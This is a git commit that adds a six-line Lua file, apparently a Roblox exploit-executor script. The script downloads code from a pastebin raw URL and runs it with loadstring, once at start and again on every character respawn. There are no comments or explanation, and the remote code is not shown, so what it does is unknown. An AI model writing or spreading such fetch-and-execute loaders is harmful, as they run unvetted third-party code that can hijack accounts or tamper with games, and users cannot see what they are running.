ac77eef774a401ce334b7b39a49e185051ec6b7c
shlexx <ginirbi@gmail.com>
2024-09-22 23:19:12 +0300

    Create temp6auto.lua

---
+++ temp6auto.lua
@@ -0,0 +1,6 @@
+loadstring(game:HttpGet("pastebin.com/raw/KTs6RX0w"))()
+local p = game.Players.LocalPlayer
+p.CharacterAdded:Connect(function()
+wait(1)
+loadstring(game:HttpGet("pastebin.com/raw/KTs6RX0w"))()
+end)
